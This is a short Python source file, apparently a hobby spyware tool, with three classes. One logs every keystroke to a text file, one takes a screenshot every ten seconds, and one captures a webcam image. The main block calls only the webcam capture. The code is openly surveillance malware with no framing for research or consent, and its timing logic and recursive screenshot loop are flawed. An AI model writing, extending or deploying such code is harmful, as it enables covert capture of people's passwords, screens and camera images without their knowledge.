#!/bin/python

import os
import datetime
import time
import cv2
from pynput import keyboard
import pyautogui


class Keylogger:
    def __init__(self):
        # set initial start time
        self.last_time = int(datetime.datetime.now().strftime('%S'))
        with keyboard.Listener(
                on_press=self.on_press) as listener:
            listener.join()

    def on_press(self, key):
        self.write_to_log(key)

    def write_to_log(self, key):
        with open('test.txt', 'a') as log_file:
            # if any key hasn't been pressed in the last three seconds, write a semicolon to the file for better outline
            now = int(datetime.datetime.now().strftime('%S'))
            diff_time = now - self.last_time
            if diff_time > 3:
                log_file.write(';')

            string_key = str(key)
            string_key = string_key.replace("'", "")
            log_file.write(string_key)
            log_file.close()
            # update variable which specifies the last time the file has been written to
            self.last_time = int(datetime.datetime.now().strftime('%S'))


class ScreenshotTaker:
    def __init__(self):
        self.number_of_screenshots = 0
        self.take_and_save_screenshot()

    def take_and_save_screenshot(self):
        """
        take a screenshot every 10 seconds and save it in the current working directory
        """
        screenshot = pyautogui.screenshot()
        screenshot.save(f'{os.getcwd()}/screenshot{self.number_of_screenshots}.png')
        time.sleep(10)
        self.number_of_screenshots += 1
        self.take_and_save_screenshot()


class WebcamPictureTaker:
    def __init__(self):
        self.take_webcam_picture()

    def take_webcam_picture(self):
        cam_port = 0
        cam = cv2.VideoCapture(cam_port)
        result, image = cam.read()
        if result:
            cv2.imwrite("webcam.png", image)


if __name__ == '__main__':
    test = WebcamPictureTaker()
